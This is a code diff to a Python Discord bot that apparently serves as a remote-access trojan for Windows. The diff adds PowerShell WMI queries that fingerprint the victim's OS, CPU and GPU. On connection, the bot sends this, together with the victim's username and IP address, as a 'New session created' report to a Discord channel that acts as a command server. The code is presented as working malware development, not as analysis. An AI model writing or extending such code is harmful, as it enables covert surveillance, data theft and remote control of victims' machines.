@@ -1,4 +1,22 @@
-import os, discord, subprocess, requests, pyautogui, re, shutil, json, sys
+import os, discord, subprocess, requests, pyautogui, re, shutil, json, sys, platform, psutil
+
+def get_processor():
+    stdout = subprocess.Popen(
+        ["powershell.exe", "Get-WmiObject -Class Win32_Processor -ComputerName. | Select-Object -Property Name"], stdout=subprocess.PIPE
+    ).stdout.read().decode()
+    return stdout.split("\n")[3]
+
+def get_gpu():
+    stdout = subprocess.Popen(
+        ["powershell.exe", "Get-WmiObject -Class Win32_VideoController -ComputerName. | Select-Object -Property Name"], stdout=subprocess.PIPE
+    ).stdout.read().decode()
+    return stdout.split("\n")[3]
+
+def get_os():
+    stdout = subprocess.Popen(
+        ["powershell.exe", "Get-WmiObject -Class Win32_OperatingSystem -ComputerName. | Select-Object -Property Caption"], stdout=subprocess.PIPE
+    ).stdout.read().decode()
+    return stdout.split("\n")[3]
 
 def resource_path(relative_path):
     if hasattr(sys, "_MEIPASS"):
@@ -40,8 +58,14 @@ async def on_ready():
     embed = discord.Embed(title="New session created", description="", color=0xfafafa)
     embed.add_field(name="Session ID", value=f"```{session_id}```", inline=True)
     embed.add_field(name="Username", value=f"```{os.getlogin()}```", inline=True)
-    embed.add_field(name="IP Address", value=f"```{ip_address}```", inline=True)
-    embed.add_field(name="Commands", value=f"```{commands}```", inline=False)
+    embed.add_field(name="🛰️  Network Information", value=f"```IP: {ip_address}```", inline=False)
+    sys_info = "\n".join([
+        f"OS: {get_os()}",
+        f"CPU: {get_processor()}",
+        f"GPU: {get_gpu()}"
+    ])
+    embed.add_field(name="🖥️  System Information", value=f"```{sys_info}```", inline=False)
+    embed.add_field(name="🤖  Commands", value=f"```{commands}```", inline=False)
     await channel.send(embed=embed)
 
 @bot.event
